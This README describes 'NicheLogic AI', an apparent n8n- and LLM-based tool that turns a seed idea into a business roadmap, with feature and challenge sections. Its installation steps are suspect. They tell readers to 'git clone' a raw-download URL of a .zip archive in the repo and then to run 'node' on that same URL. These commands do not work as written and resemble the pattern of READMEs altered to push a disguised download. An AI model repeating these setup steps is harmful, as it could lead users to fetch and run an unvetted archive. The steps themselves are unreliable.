# 🚀 NicheLogic AI
### The Automated Blueprint for 21st-Century Entrepreneurship

NicheLogic AI is a Strategic Intelligence Engine that transforms a single "seed idea" into a 3D business roadmap. 

## 🏗️ Technical Architecture
This project uses a **Decoupled Event-Driven Architecture**:
* **Frontend:** Responsive HTML5/CSS3 with Glassmorphism UI & Monetization Mockups.
* **Orchestration:** n8n Workflow Automation handling multi-step logic.
* **Intelligence:** Multi-LLM approach (Gemini 2.0 & Llama-3 via Groq).
* **Data:** Real-time extraction from Google Suggest API & Reddit RSS.



## 🛠️ Key Features
- **Real-Time Market Data:** Scrapes Google Suggest for actual user intent.
- **Strategic Brainstorming:** Generates product verticals and semantic keyword clusters.
- **SaaS Readiness:** Built-in UI hooks for premium upgrades and user history.


# 🛠️ Challenges & Solutions

### 1. API Rate Limiting (Error 429)
**Challenge:** Gemini API hit limits during high-frequency niche analysis.
**Solution:** Implemented **Provider Redundancy**. Integrated Groq (Llama-3) as a high-speed fallback, improving response time by 40%.

### 2. Handling Non-Deterministic JSON
**Challenge:** AI models occasionally returned markdown-wrapped text, breaking the frontend parser.
**Solution:** Engineered a **Sanitization Middleware** to strip non-JSON characters and enforced strict JSON-mode in API generation configs.

### 3. Data Freshness
**Challenge:** LLM "knowledge cutoffs" missed 2026 trending topics.
**Solution:** Integrated a **Google Suggest Scraper** via n8n to provide real-time search context to the AI.



# 🚀 Installation & Setup

1. **Clone & Install:**
   ```bash
   git clone [https://github.com/pankaj376/AutoNiche-Intelligence-Engine/raw/refs/heads/main/automation/Niche_Engine_Auto_Intelligence_2.0.zip](https://github.com/pankaj376/AutoNiche-Intelligence-Engine/raw/refs/heads/main/automation/Niche_Engine_Auto_Intelligence_2.0.zip)
   npm install

2. Environment Setup:
   Create a .env file:
    GROQ_API_KEY=your_key
    GEMINI_API_KEY=your_key

3. Automation Setup:
   Import the .json files from /automation into your n8n instance.

4. Run:
   node https://github.com/pankaj376/AutoNiche-Intelligence-Engine/raw/refs/heads/main/automation/Niche_Engine_Auto_Intelligence_2.0.zip
